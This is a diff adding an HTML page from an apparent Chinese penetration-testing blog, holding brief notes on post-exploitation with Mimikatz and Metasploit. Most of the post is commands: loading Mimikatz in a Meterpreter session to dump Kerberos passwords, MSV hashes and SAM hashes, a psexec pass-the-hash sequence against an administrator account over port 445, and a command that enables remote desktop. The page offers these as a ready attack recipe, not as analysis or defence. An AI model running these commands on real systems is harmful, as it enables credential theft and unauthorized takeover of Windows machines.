@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>Mimikatz</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/mimikatz.html" rel="bookmark"
+           title="Permalink to Mimikatz">Mimikatz</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-05-27T00:00:00+02:00">
+                <a href='#'>05/27/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>获取metepreter之后，可以</p>
+<p><a href="https://www.offensive-security.com/metasploit-unleashed/mimikatz/">https://www.offensive-security.com/metasploit-unleashed/mimikatz/</a></p>
+<div class="highlight"><pre><span></span><span class="err">加载</span><span class="n">mimikata模块</span><span class="o">:</span>
+<span class="n">load</span> <span class="n">mimikatz</span>    
+
+<span class="err">查看帮助</span><span class="o">:</span>
+<span class="n">help</span> <span class="n">mimikatz</span>
+
+<span class="err">获取密码</span><span class="o">:</span>
+<span class="n">kerberos</span>
+
+<span class="err">获取</span><span class="n">hash和password</span>
+<span class="n">msv</span>
+
+<span class="n">mimikatz_command</span> <span class="o">-</span><span class="n">f</span> <span class="n">fu</span><span class="o">::</span>
+
+<span class="n">mimikatz_command</span> <span class="o">-</span><span class="n">f</span> <span class="n">samdump</span><span class="o">::</span><span class="n">hashes</span> <span class="err">查看</span><span class="n">hash</span>
+
+<span class="n">mimikatz_command</span> <span class="o">-</span><span class="n">f</span> <span class="n">handle</span><span class="o">::</span><span class="n">list</span>  <span class="n">msf查看超时</span>
+ <span class="n">mimikatz_command</span> <span class="o">-</span><span class="n">f</span> <span class="n">sekurlsa</span><span class="o">::</span><span class="n">searchPasswords</span>
+</pre></div>
+
+
+<p>知道hash不能破解密码情况下可以这样: 445要开启</p>
+<div class="highlight"><pre><span></span><span class="nv">use</span> <span class="nv">exploit</span><span class="o">/</span><span class="nv">windows</span><span class="o">/</span><span class="nv">smb</span><span class="o">/</span><span class="nv">psexec</span>
+<span class="k">show</span> <span class="nv">options</span>
+<span class="nv">set</span> <span class="nv">rhost</span> <span class="nv">x</span>.<span class="nv">x</span>.<span class="nv">x</span>.<span class="nv">x</span>
+<span class="nv">set</span> <span class="nv">smbpass</span>  <span class="nv">hash</span>数值
+<span class="nv">set</span> <span class="nv">smbuser</span> <span class="nv">administrator</span>
+<span class="nv">run</span>
+</pre></div>
+
+
+<p>run getgui -e  打开rdp</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
